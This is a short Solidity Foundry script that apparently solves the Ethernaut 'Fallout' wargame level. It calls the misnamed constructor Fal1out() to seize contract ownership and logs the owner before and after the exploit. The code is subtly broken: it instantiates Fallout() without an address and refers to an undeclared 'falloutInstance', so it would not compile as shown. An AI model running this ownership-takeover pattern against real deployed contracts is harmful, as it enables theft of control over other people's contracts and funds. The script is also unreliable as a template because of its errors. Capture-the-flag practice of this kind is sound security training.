// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";

contract SolveFallout is Script {
    // Create an instance of the Fallout contract, replace with your contract address
    Fallout public f = Fallout();

    function run() external {
        // Start broadcasting transactions using the PRIVATE_KEY environment variable
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Log the initial owner of the contract
        console.log("Initial owner: ", falloutInstance.owner());

        // Call the improperly named constructor function to exploit the contract
        f.Fal1out();

        // Log the owner of the contract after the exploit
        console.log("Owner after exploit: ", falloutInstance.owner());

        // Log the address of the current account
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));

        // Stop broadcasting transactions
        vm.stopBroadcast();
    }
}
